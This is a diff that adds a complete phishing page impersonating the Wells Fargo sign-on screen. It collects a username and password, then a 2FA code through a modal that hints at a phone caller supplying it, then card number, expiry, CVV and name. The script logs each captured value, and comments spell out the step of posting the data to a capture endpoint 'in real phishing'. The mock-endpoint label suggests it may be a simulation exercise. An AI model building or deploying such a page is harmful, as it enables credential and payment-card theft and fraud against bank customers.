@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Sign On to View Your Accounts</title>
+    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+    <style>
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; background-color: #ffffff; }
+        .wells-red { background-color: #CD1409; }
+        .wells-yellow { color: #FFFF00; }
+        .wells-input { border: 1px solid #d1d5db; padding: 10px; border-radius: 5px; width: 100%; }
+        .secure-badge { background-color: #e5f5e0; color: #2f855a; padding: 5px 10px; border-radius: 5px; font-size: 14px; }
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 1000; }
+        .modal-content { background: white; margin: 10% auto; padding: 30px; width: 90%; max-width: 600px; border-radius: 10px; }
+        .mega-menu { display: none; position: absolute; background: white; box-shadow: 0 4px 6px rgba(0,0,0,0.1); width: 100%; left: 0; z-index: 10; }
+        .mega-menu:hover, .menu-item:hover .mega-menu { display: block; }
+        .carousel { overflow-x: auto; white-space: nowrap; }
+        .carousel-item { display: inline-block; width: 300px; margin-right: 10px; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col">
+    <!-- Header -->
+    <header class="wells-red text-white p-4">
+        <div class="container mx-auto flex justify-between items-center">
+            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMzAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjQ0QxNDA5Ii8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmhlciwgSGVsdmV0aWNhIE5ldWUsIEFyaWFsLCBzYW5zLXNlcmlmIiBmb250LXNpemU9IjQ1IiBmb250LXdlaWdodD0iNzAwIiBmaWxsPSIjZmZmZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkb21pbmFudC1iYXNlbGluZT0ibWlkZGxlIj5XRUxMUyBGQVJHTzwvdGV4dD48L3N2Zz4=" alt="Wells Fargo Logo" class="h-12">
+            <nav class="flex space-x-6">
+                <div class="menu-item relative">
+                    <a href="#" class="text-white hover:underline">Personal</a>
+                    <div class="mega-menu p-4 grid grid-cols-3 gap-4">
+                        <a href="#" class="text-gray-800 hover:underline">Checking Accounts</a>
+                        <a href="#" class="text-gray-800 hover:underline">Savings Accounts</a>
+                        <a href="#" class="text-gray-800 hover:underline">Credit Cards</a>
+                    </div>
+                </div>
+                <div class="menu-item relative">
+                    <a href="#" class="text-white hover:underline">Small Business</a>
+                    <div class="mega-menu p-4 grid grid-cols-3 gap-4">
+                        <a href="#" class="text-gray-800 hover:underline">Business Checking</a>
+                        <a href="#" class="text-gray-800 hover:underline">Loans & Credit</a>
+                        <a href="#" class="text-gray-800 hover:underline">Merchant Services</a>
+                    </div>
+                </div>
+                <a href="#" class="text-white hover:underline">Commercial</a>
+                <a href="#" class="text-white hover:underline wells-yellow font-bold">Sign On</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Financial Needs Carousel -->
+    <section class="container mx-auto mt-6 px-4">
+        <div class="carousel">
+            <div class="carousel-item bg-gray-100 p-4 rounded-lg">
+                <h3 class="text-lg font-bold">Home Lending</h3>
+                <p>Explore mortgages and first-time buyer options.</p>
+            </div>
+            <div class="carousel-item bg-gray-100 p-4 rounded-lg">
+                <h3 class="text-lg font-bold">Banking Made Easy</h3>
+                <p>Checking, savings, and mobile banking.</p>
+            </div>
+            <div class="carousel-item bg-gray-100 p-4 rounded-lg">
+                <h3 class="text-lg font-bold">Retirement</h3>
+                <p>Plan with savings and IRA options.</p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Main Login Section -->
+    <main class="container mx-auto mt-8 p-4 max-w-lg">
+        <div class="bg-white p-8 rounded-lg shadow-lg">
+            <h2 class="text-3xl font-bold text-gray-800 mb-6">Sign On to View Your Accounts</h2>
+            <div class="secure-badge mb-6 inline-block">Secure Connection</div>
+            <form id="loginForm" onsubmit="handleLogin(event)">
+                <div class="mb-6">
+                    <label for="username" class="block text-gray-700 font-medium">Username</label>
+                    <input type="text" id="username" class="wells-input" required>
+                </div>
+                <div class="mb-6">
+                    <label for="password" class="block text-gray-700 font-medium">Password</label>
+                    <input type="password" id="password" class="wells-input" required>
+                </div>
+                <button type="submit" class="wells-red text-white py-3 px-6 rounded-lg hover:bg-red-700 w-full">Sign On</button>
+            </form>
+            <div class="mt-6 text-sm">
+                <a href="#" class="text-blue-600 hover:underline">Forgot Username or Password?</a>
+            </div>
+        </div>
+    </main>
+
+    <!-- 2FA Modal -->
+    <div id="twoFactorModal" class="modal">
+        <div class="modal-content">
+            <h3 class="text-2xl font-bold mb-6">Verify Your Identity</h3>
+            <p class="mb-6">We’ve sent a 6-digit code to your registered phone or email. Please enter it below. Your caller may provide the code: <strong>472951</strong></p>
+            <form id="twoFactorForm" onsubmit="handleTwoFactor(event)">
+                <div class="mb-6">
+                    <label for="twoFactorCode" class="block text-gray-700 font-medium">6-Digit Code</label>
+                    <input type="text" id="twoFactorCode" class="wells-input" maxlength="6" required>
+                </div>
+                <button type="submit" class="wells-red text-white py-3 px-6 rounded-lg hover:bg-red-700 w-full">Verify</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Credit Card Modal -->
+    <div id="creditCardModal" class="modal">
+        <div class="modal-content">
+            <h3 class="text-2xl font-bold mb-6">Update Payment Information</h3>
+            <p class="mb-6">Please verify your credit card details to secure your account.</p>
+            <form id="creditCardForm" onsubmit="handleCreditCard(event)">
+                <div class="mb-6">
+                    <label for="cardNumber" class="block text-gray-700 font-medium">Card Number</label>
+                    <input type="text" id="cardNumber" class="wells-input" maxlength="16" required>
+                </div>
+                <div class="flex space-x-6 mb-6">
+                    <div class="w-1/2">
+                        <label for="expiry" class="block text-gray-700 font-medium">Expiration Date</label>
+                        <input type="text" id="expiry" class="wells-input" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+                    <div class="w-1/2">
+                        <label for="cvv" class="block text-gray-700 font-medium">CVV</label>
+                        <input type="text" id="cvv" class="wells-input" maxlength="3" required>
+                    </div>
+                </div>
+                <div class="mb-6">
+                    <label for="cardName" class="block text-gray-700 font-medium">Name on Card</label>
+                    <input type="text" id="cardName" class="wells-input" required>
+                </div>
+                <button type="submit" class="wells-red text-white py-3 px-6 rounded-lg hover:bg-red-700 w-full">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="wells-red text-white p-6 mt-auto">
+        <div class="container mx-auto text-center">
+            <p class="text-sm">&copy; 2025 Wells Fargo Bank, N.A. All rights reserved. Member FDIC.</p>
+            <div class="mt-4 space-x-4 text-sm">
+                <a href="#" class="text-white hover:underline">Privacy</a>
+                <a href="#" class="text-white hover:underline">Security</a>
+                <a href="#" class="text-white hover:underline">Legal</a>
+                <a href="#" class="text-white hover:underline">Contact Us</a>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function handleLogin(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            // Simulate data capture (ZCSC mock endpoint)
+            console.log(`Captured: Username=${username}, Password=${password}`);
+            // In real phishing, send to server: fetch('data-capture.php', { method: 'POST', body: JSON.stringify({ username, password }) });
+            document.getElementById('loginForm').reset();
+            document.getElementById('twoFactorModal').style.display = 'block';
+        }
+
+        function handleTwoFactor(event) {
+            event.preventDefault();
+            const code = document.getElementById('twoFactorCode').value;
+            if (code === '472951') {
+                // Simulate successful 2FA
+                console.log(`Captured: 2FA Code=${code}`);
+                document.getElementById('twoFactorModal').style.display = 'none';
+                document.getElementById('creditCardModal').style.display = 'block';
+            } else {
+                alert('Invalid code. Please try again.');
+            }
+        }
+
+        function handleCreditCard(event) {
+            event.preventDefault();
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const cardName = document.getElementById('cardName').value;
+            // Simulate data capture (ZCSC mock endpoint)
+            console.log(`Captured: CardNumber=${cardNumber}, Expiry=${expiry}, CVV=${cvv}, Name=${cardName}`);
+            // In real phishing, send to server: fetch('data-capture.php', { method: 'POST', body: JSON.stringify({ cardNumber, expiry, cvv, cardName }) });
+            alert('Payment information updated successfully. Thank you.');
+            document.getElementById('creditCardModal').style.display = 'none';
+            document.getElementById('creditCardForm').reset();
+        }
+    </script>
+</body>
+</html>
